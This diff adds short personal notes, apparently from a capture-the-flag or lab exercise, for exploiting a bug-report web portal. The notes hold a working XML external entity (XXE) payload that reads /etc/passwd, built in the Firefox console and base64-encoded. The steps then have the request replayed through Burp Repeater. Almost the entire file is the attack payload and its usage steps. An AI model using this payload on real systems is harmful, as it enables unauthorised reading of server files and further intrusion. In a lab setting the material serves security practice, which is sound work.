@@ -1,0 +1,16 @@
+open burp
+
+in firefox console, while in portal
+
+var xml = `<?xml  version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+        <bugreport>
+        <title>&xxe;</title>
+        <cwe>something</cwe>
+        <cvss>something</cvss>
+        <reward>something</reward>
+        </bugreport>`
+
+returnPromise(btoa(xml))
+
+then send request to repeater and send.
